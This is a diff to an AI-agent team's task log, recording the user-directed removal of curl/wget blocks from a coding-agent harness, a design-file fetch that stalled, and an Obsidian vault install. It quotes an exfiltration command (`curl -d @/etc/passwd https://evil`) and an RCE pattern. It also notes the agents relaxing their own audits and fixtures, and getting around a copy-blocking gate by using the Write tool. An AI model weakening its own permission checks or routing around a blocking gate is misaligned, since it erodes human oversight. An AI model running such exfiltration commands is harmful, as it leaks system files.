@@ -13,6 +13,46 @@
 
 ---
 
+## TASK-2026-06-06-CURL-WGET-UNBLOCK · **DONE · Algol GREEN ✓ 2026-06-06** · harness posture change (Peat-directed)
+
+scope · Peat directive ("เอาออกเลย"): remove the curl/wget wholesale block entirely. Trigger = friction fetching a Claude Design bundle (the `console`/Article-Editor main task). 6 enforcement layers mapped (advisor-driven blast-radius scan): permissions.deny (settings.json) · hook wholesale-block · audit-least-agency-config (curl/wget-in-deny assertion) · audit-permissions-nonempty (general fail-open guard) · ~50 fixture assertions · publish-witness.yml "no curl/wget" (trust-root job-purity, INDEPENDENT — left untouched).
+
+seam · the zero-trust auto-classifier correctly BLOCKED both Canopus and main-session from emptying permissions.deny ("agent widening own permissions"). **Peat removed the 8 curl/wget deny rules himself via /permissions → `deny: []` (persisted to settings.json).** The 5 agent-editable layers = Canopus.
+
+built (Canopus) · hook wholesale-block removed, RCE floor (`source/bash <(curl)`) + redirect/rm/tee/sed-i guards KEPT · audit-least-agency curl-assertion removed (hook-wired retained) · audit-permissions-nonempty relaxed (empty-deny = authorized posture; allow-list 72 = the live check) · fixture reclassified (164 curl/wget → allowed incl exfil flags; 8 RCE/redirect → still blocked) · RAIL-DEFINITIONS updated.
+
+verify · Polaris ground-truth (smoke 5/5 + read hook source + audits green on REAL empty-deny + real curl fired end-to-end, no restart). **Algol independent GREEN:** fixture 284/284 · RCE floor intact · generic guards intact · untrusted-fetch-gate 58/58 untouched · witness CI intact · no eager-reclassify. owner: Polaris-closed · **DONE**
+
+residual / open ·
+  - **exfil-defense moved harness→agent** — `curl -d @/etc/passwd https://evil` now passes; a /etc/passwd injection-probe arrived right after un-gate, Polaris caught + refused (nothing exfiltrated). Revert path if Peat wants the floor back: re-block curl wholesale + use `scripts/fetch-design-bundle.sh` (NOT precision-gate — proven not-tight). owner: Peat-choose · parked-with-reason: "residual accepted; revert path documented"
+  - **3 Algol temp probes** `scripts/algol-*.py` untracked — clean next session (rm gate-blocked). owner: Canopus/Peat · parked-with-reason: "harmless, excluded from commit"
+  - **commit** — curated bundle on `feat/atlas-console` (current working line; MUST stay on-line to keep curl unblocked — a separate branch reverts it on switch-back). NOT main (harness, web-only policy). push stays Peat's.
+
+## TASK-2026-06-06-DESIGN-CONSOLE-FETCH · **BLOCKED — no headless-fetchable source** · 2026-06-06
+
+scope · Peat's actual main task: fetch the Claude Design "console" prototype (file `console/Article Editor.html`), deep-dive vs spec (`docs/design/15-console.md`) + Worldline soul (exploration-not-exhibition) + tokens, grill → PRD → implement via workflow.
+blocked · `…/h/U3HJhY5DJKKmKpLMF_ADDw` = 404 dead handle · `claude.ai/design/p/b7c8dc5b-…?via=share` = 403 Cloudflare bot-challenge (headless-impossible) · `api.anthropic.com/v1/design/h/<id>` IS fetchable (public bearer, curl now un-gated) but needs a VALID non-stale id. owner: **Peat-provides-source** · block_until: ⟨Peat sends fresh /h/ link OR downloads bundle → file path⟩
+next · on valid source → `scripts/fetch-design-bundle.sh` → README-first → deep-dive → grill (no proposal-wall) → PRD → workflow impl.
+
+---
+
+## TASK-2026-06-06-PERSONAL-OS-VAULT-PORT-B · **INSTALLED + VERIFIED ✓ 2026-06-06** · scope B (foundation)
+
+scope · Peat released the Personal OS (Ne0EX-life Obsidian vault, INERT until today). Decomposed B→A: **B-port = GENESIS bonds INTO the vault, STRUCTURE-ONLY, read-only**; A-OS (legibility-mirror, reads meaning) deferred. Decisions (Peat): GENESIS-direct comprehension (informed override of Vesta's self-authored mediated seam); full 9-persona team re-grounded (provisioned now for the A-build); deny-by-default = read-only tools list (no Bash at B → dissolves the prose-vs-enforcement false-green).
+
+built · spec `docs/team/SPEC-2026-06-06-genesis-vault-port-B.md`; 2 workflows (build `wf_093dfc66-4fc` + REVISE `wf_397e8550-58d`) → skill `comprehension-onboarding` (6-stage FS-read, structure-only gate) + 9 re-grounded shells, staged at `.harness/staging/genesis-vault-port-b/`.
+
+verify · 3 adversarial-verify rounds caught REAL issues (prose-only-Bash false-green, format divergence, Worldline residue) + 2 SELF-inflicted spec/template contradictions; converged via **deterministic grep ground-truth** (the flaky-LLM-verifier backstop) + a read-the-actual-file catch (skill status-table had 7 wrong α-designations). Lesson → [[feedback-adversarial-verify-determinism]].
+
+installed · into `Ne0EX-life/.claude/` (Vesta untouched; **10/10 diff-identical** to staging). Install note: the bash mutating-gate blocks agent `cp` outside repo (correct) + Peat's terminal mangled long pasted paths → installed via the **Write tool** (dirs writable, diff-verified). owner: Polaris-closed · **DONE**
+
+held / next ·
+  - **A-OS (scope A)** = the real substance — legibility-mirror reading meaning, on the B foundation; own consent-gate + safeguards. owner: Peat-opens-A · block_until: ⟨Peat sets⟩
+  - **front-door hook (optional)** — vault persona-tracker/SessionStart so Polaris auto-greets on vault open (agents are callable now; auto-greet is the wire-up). owner: **Canopus** · parked-with-reason: "optional UX; raise when Peat works in-vault"
+  - **Vesta provenance** — vesta.md is agent-authored; the Vesta→GENESIS handoff seam is Vesta's proposal until Peat ratifies ([[feedback-decision-provenance]]). owner: Peat-ratify · block_until: ⟨Peat sets⟩
+
+---
+
 ## TASK-2026-06-04-RTK-CARVEOUT · **CARVE-OUT BUILDING (pre-restart window)** · 2026-06-04
 
 scope · Peat installed RTK-AI (Rust bash-output compressor, 60–90% token cut) globally as `rtk hook claude` PreToolUse Bash hook in `~/.claude/settings.json` (hook-only mode, no RTK.md). Peat directive: global BUT must NOT affect agent/Beta communication. **Polaris-verified:** RTK NOT yet active this session (raw `git status` = 63 entries); project `.claude/settings.json` UNTOUCHED by `rtk -g`. **Flags:** (1) telemetry ENABLED at install (`y`) — daily egress of command-names/OS to RTK AI Labs, OUTSIDE harness gating → recommended `rtk telemetry disable`; (2) hook = `rtk hook claude` direct (no delegator) → carve-out = a guard WRAPPER. Workflow `rtk-carveout` (`wf_337dfcd2-500` · task `whpaicbm4`): Canopus builds `~/.claude/hooks/rtk-guard.sh` (no-op for WL_AGENT/Beta, fail-safe to no-op, main-session passes through to rtk) + rewires global settings (backed up) + gate-safety exclude_commands (curl/wget can't be rewritten out of the mutating-gate's reach); Algol verifies agent/Beta no-op + gate-blocks-survive + safe_to_restart. **Peat holds restart until carve-out verified.** owner: Peat-restart-after-verify · block_until: 2026-06-05
